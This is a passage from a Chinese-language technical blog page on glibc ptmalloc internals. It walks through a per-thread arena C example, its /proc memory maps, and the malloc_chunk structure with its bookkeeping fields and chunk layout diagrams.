class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Per thread arena example. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">threadFunc</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="type">char</span>* addr = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">pthread_t</span> t1;</span><br><span class="line">        <span class="type">void</span>* s;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        <span class="type">char</span>* addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        addr = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        ret = pthread_create(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);  <span class="comment">//</span></span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread creation error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = pthread_join(t1, &amp;s);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread join error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>第一次申请之前</strong>， 没有任何任何堆段。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::<span class="number">6501</span></span><br><span class="line">Before <span class="built_in">malloc</span> in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="number">6501</span>/maps</span><br><span class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line"><span class="number">0804</span>a000<span class="number">-0804b</span>000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">b7e05000-b7e07000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><p><strong>第一次申请后</strong>， 从下面的输出可以看出，堆段被建立了，并且它就紧邻着数据段，这说明 malloc 的背后是用 brk 函数来实现的。同时，需要注意的是，我们虽然只是申请了 1000 个字节，但是我们却得到了 0x0806c000-0x0804b000&#x3D;0x21000 个字节的堆。<strong>这说明虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。</strong>我们称这一块连续的内存区域为 arena。此外，我们称由主线程申请的内存为 main_arena。后续的申请的内存会一直从这个 arena 中获取，直到空间不足。当 arena 空间不足时，它可以通过增加 brk 的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::<span class="number">6501</span></span><br><span class="line">Before <span class="built_in">malloc</span> in main thread</span><br><span class="line">After <span class="built_in">malloc</span> and before <span class="built_in">free</span> in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/<span class="number">6501</span>/maps</span><br><span class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line"><span class="number">0804</span>a000<span class="number">-0804b</span>000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line"><span class="number">0804b</span>000<span class="number">-0806</span>c000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><p><strong>在主线程释放内存后</strong>，我们从下面的输出可以看出，其对应的 arena 并没有进行回收，而是交由 glibc 来进行管理。当后面程序再次申请内存时，在 glibc 中管理的内存充足的情况下，glibc 就会根据堆分配的算法来给程序分配相应的内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::<span class="number">6501</span></span><br><span class="line">Before <span class="built_in">malloc</span> in main thread</span><br><span class="line">After <span class="built_in">malloc</span> and before <span class="built_in">free</span> in main thread</span><br><span class="line">After <span class="built_in">free</span> in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/<span class="number">6501</span>/maps</span><br><span class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line"><span class="number">0804</span>a000<span class="number">-0804b</span>000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line"><span class="number">0804b</span>000<span class="number">-0806</span>c000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><p><strong>在第一个线程 malloc 之前</strong>，我们可以看到并没有出现与线程 1 相关的堆，但是出现了与线程 1 相关的栈。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::<span class="number">6501</span></span><br><span class="line">Before <span class="built_in">malloc</span> in main thread</span><br><span class="line">After <span class="built_in">malloc</span> and before <span class="built_in">free</span> in main thread</span><br><span class="line">After <span class="built_in">free</span> in main thread</span><br><span class="line">Before <span class="built_in">malloc</span> in thread <span class="number">1</span></span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="number">6501</span>/maps</span><br><span class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line"><span class="number">0804</span>a000<span class="number">-0804b</span>000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line"><span class="number">0804b</span>000<span class="number">-0806</span>c000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [heap]</span><br><span class="line">b7604000-b7605000 ---p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">b7605000-b7e07000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [<span class="built_in">stack</span>:<span class="number">6594</span>]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><p><strong>第一个线程 malloc 后</strong>， 我们可以从下面输出看出线程 1 的堆段被建立了。而且它所在的位置为内存映射段区域，同样大小也是 132KB(b7500000-b7521000)。因此这表明该线程申请的堆时，背后对应的函数为 mmap 函数。同时，我们可以看出实际真的分配给程序的内存为 1M(b7500000-b7600000)。而且，只有 132KB 的部分具有可读可写权限，这一块连续的区域成为 thread arena。</p><p>注意：</p><blockquote><p>当用户请求的内存大于 128KB 时，并且没有任何 arena 有足够的空间时，那么系统就会执行 mmap 函数来分配相应的内存空间。这与这个请求来自于主线程还是从线程无关。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::<span class="number">6501</span></span><br><span class="line">Before <span class="built_in">malloc</span> in main thread</span><br><span class="line">After <span class="built_in">malloc</span> and before <span class="built_in">free</span> in main thread</span><br><span class="line">After <span class="built_in">free</span> in main thread</span><br><span class="line">Before <span class="built_in">malloc</span> in thread <span class="number">1</span></span><br><span class="line">After <span class="built_in">malloc</span> and before <span class="built_in">free</span> in thread <span class="number">1</span></span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="number">6501</span>/maps</span><br><span class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line"><span class="number">0804</span>a000<span class="number">-0804b</span>000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line"><span class="number">0804b</span>000<span class="number">-0806</span>c000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [heap]</span><br><span class="line">b7500000-b7521000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">b7521000-b7600000 ---p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">b7604000-b7605000 ---p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">b7605000-b7e07000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [<span class="built_in">stack</span>:<span class="number">6594</span>]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><p><strong>在第一个线程释放内存后</strong>， 我们可以从下面的输出看到，这样释放内存同样不会把内存重新给系统。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::<span class="number">6501</span></span><br><span class="line">Before <span class="built_in">malloc</span> in main thread</span><br><span class="line">After <span class="built_in">malloc</span> and before <span class="built_in">free</span> in main thread</span><br><span class="line">After <span class="built_in">free</span> in main thread</span><br><span class="line">Before <span class="built_in">malloc</span> in thread <span class="number">1</span></span><br><span class="line">After <span class="built_in">malloc</span> and before <span class="built_in">free</span> in thread <span class="number">1</span></span><br><span class="line">After <span class="built_in">free</span> in thread <span class="number">1</span></span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="number">6501</span>/maps</span><br><span class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line"><span class="number">0804</span>a000<span class="number">-0804b</span>000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line"><span class="number">0804b</span>000<span class="number">-0806</span>c000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [heap]</span><br><span class="line">b7500000-b7521000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">b7521000-b7600000 ---p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">b7604000-b7605000 ---p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">b7605000-b7e07000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [<span class="built_in">stack</span>:<span class="number">6594</span>]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><h4 id="glibc内存管理篇"><a href="#glibc内存管理篇" class="headerlink" title="glibc内存管理篇"></a>glibc内存管理篇</h4><h4 id="5-源代码分析"><a href="#5-源代码分析" class="headerlink" title="5.  源代码分析"></a>5.  源代码分析</h4><h5 id="5-1-边界标记法"><a href="#5-1-边界标记法" class="headerlink" title="5.1  边界标记法"></a>5.1  边界标记法</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  这个字段存储前一个内存块的大小（以字节为单位），但仅当这个内存块是“空闲”的（也就是当前没有被分配）时才有意义。*/</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead.这个字段存储当前内存块的大小（字节为单位），包括管理这片内存所需的额外开销。这意味着这个数字可能比用户请求的大小要大一些，因为它还包括结构体自身的大小以及可能的填充字节，以保持内存对齐。 */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. 这是一个指向下一个内存块的指针，只有当当前内存块是空闲的时候，这个指针才有用。它用于双向链表结构中，指向链表中的下一块空闲内存块。*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span>         <span class="comment">/*这是一个指向上一个内存块的指针，同样地，只有当前内存块是空闲的时候，这个指针才有用，它是双向链表中的向前链接。*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free.这个字段是为了管理较大的内存块而设置的，它是指向上一个geng&#x27;xiao内存块的指针。这个指针也只在当前内存块空闲时使用。 */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span>  <span class="comment">/* 这个字段类似于`fd_nextsize`，但它指向的是下一个更大的内存块。*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>prev_size</strong>:如果前一个 chunk 是<strong>空闲</strong>的，该域表示<strong>前一个 chunk 的大小</strong>，如果前一个 chunk <strong>不空闲</strong>，该域<strong>无意义</strong>。 </p><p><strong>size</strong>：<strong>当前 chunk 的大小</strong>，并且<strong>记录了当前 chunk 和前一个 chunk 的一些属性</strong>，包括前一个 chunk 是否在使用中，当前 chunk 是否是通过 mmap 获得的内存，当前 chunk 是否属于 非主分配区。</p><p> <strong>fd 和 bk</strong>：指针 fd 和 bk <strong>只有当该 chunk 块空闲时才存在</strong>，其作用是用于将对应的空闲 chunk 块加入到空闲 chunk 块链表中统一管理，如果该 chunk 块被分配给应用程序使用，那 么这两个指针也就没有用（该 chunk 块已经从空闲链中拆出）了，所以也<strong>当作应用程序的使用空间</strong>，而不至于浪费。 <strong>fd指向低地址，bk指向高地址</strong></p><p><strong>fd_nextsize 和 bk_nextsize</strong>:当当前的 chunk 存在于 large bins 中时，large bins 中的空闲 chunk 是按照大小排序的，但同一个大小的 chunk 可能有多个，增加了这两个字段可以<strong>加快遍历空闲 chunk</strong>，并查找满足需要的空闲 chunk，<strong>fd_nextsize 指向下一个比当前 chunk 大小 大的第一个空闲 chunk</strong>，<strong>bk_nextszie 指向前一个比当前 chunk 大小小的第一个空闲 chunk</strong>。 <strong>如果该 chunk 块被分配给应用程序使用，那么这两个指针也就没有用</strong>（该 chunk 块已经从 size 链中拆出）了，所以也<strong>当作应用程序的使用空间</strong>，而不至于浪费。</p><p>一个已分配的块的结构如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt;  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">         | 前一个块的大小（如果已分配） | |</span><br><span class="line">         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">         | 块的大小（以字节为单位） |M|P|</span><br><span class="line"> mem-&gt;   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">         | 用户数据从这里开始... .</span><br><span class="line">         . </span><br><span class="line">         . （malloc_usable_size() 字节） </span><br><span class="line">         .</span><br><span class="line">         |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">             | 块的大小 |</span><br><span class="line">             +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>在这里，”chunk”在大多数malloc代码中表示块的前部，而”mem”是返回给调用者的指针。块的前部包含了前一个块的大小（如果该块已分配），以及当前块的大小（以字节为单位）。”M”和”P”是用于表示块的状态（分配或空闲）的位标志。”mem”指针指向的位置是用户数据的起始位置。下一个块的位置由”nextchunk”指针表示，并且包含了下一个块的大小信息。</p><p>空闲块以循环双向链表的形式存储，结构如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt;  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">         | 前一个块的大小 |</span><br><span class="line">         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:<span class="string">&#x27;  | 块的大小（以字节为单位） |P|</span></span><br><span class="line"><span class="string"> mem-&gt;   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">         | 指向链表中下一个块的前向指针 |fd</span></span><br><span class="line"><span class="string">         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">         | 指向链表中前一个块的后向指针 |bk</span></span><br><span class="line"><span class="string">         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">         | 未使用的空间（可能为0字节） .</span></span><br><span class="line"><span class="string">         .</span></span><br><span class="line"><span class="string">         . |</span></span><br><span class="line"><span class="string">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">`foot:&#x27;</span>  | 块的大小 |</span><br><span class="line">         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>​在这里，空闲块的结构与已分配块的结构类似，但有一些差别。空闲块的前部包含了前一个块的大小。<code>head:</code>标记表示这是一个空闲块的头部。在<code>mem</code>指针指向的位置，<strong>存储了块的大小信息和状态标志</strong>（P表示空闲）。空闲块还包含了指向链表中下一个块和前一个块的指针，<strong>形成了循环双向链表的结构</strong>。链表的头部指针指向第一个空闲块。<strong>空闲块的尾部有一个<code>foot:</code>标记，标识块的大小</strong>。</p><p>​<strong>P（PREV_INUSE）位存储在chunk大小的未使用的低位上（chunk大小总是二字倍数）</strong>，它是用于标记<strong>前一个chunk</strong>是否在使用的一个位。如果该位被<em>清除</em>，则当前chunk大小之前的字包含了前一个chunk的大小，并且可以用来找到上一个chunk的开头。第一次分配的chunk总是设置了这个位，这样可以防止访问不存在的（或不属于自己的）内存。如果任何给定的chunk的prev_inuse被设置，则你无法确定前一个chunk的大小，甚至在尝试这样做时可能会遇到内存寻址错误。</p><p>​值得注意的是，当前chunk的<code>foot</code><strong>实际上表示为下一个chunk的prev_size</strong>。这样做可以更容易地处理对齐等问题，但在尝试扩展或适应这段代码时可能会非常困惑。</p><p>​所有这些都有两个异常情况：</p><ol><li>特殊的chunk <code>顶端</code>（top）并不使用它的后续大小字段，因为没有紧接着的下一个chunk需要依赖它的索引。在初始化后，<code>顶端</code>chunk强制被设置为一直存在。如果它变得小于MINSIZE字节，则会被重新填充。</li><li>通过mmap分配的chunks，在其大小字段中设置了第二低位的M（IS_MMAPPED）位。因为它们是单独一个一个分配的，每一个都必须包含自己的后续大小字段。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* conversion from malloc headers to user pointers, and back */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem(p) ((Void_t*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></span><br><span class="line"><span class="comment">/* The 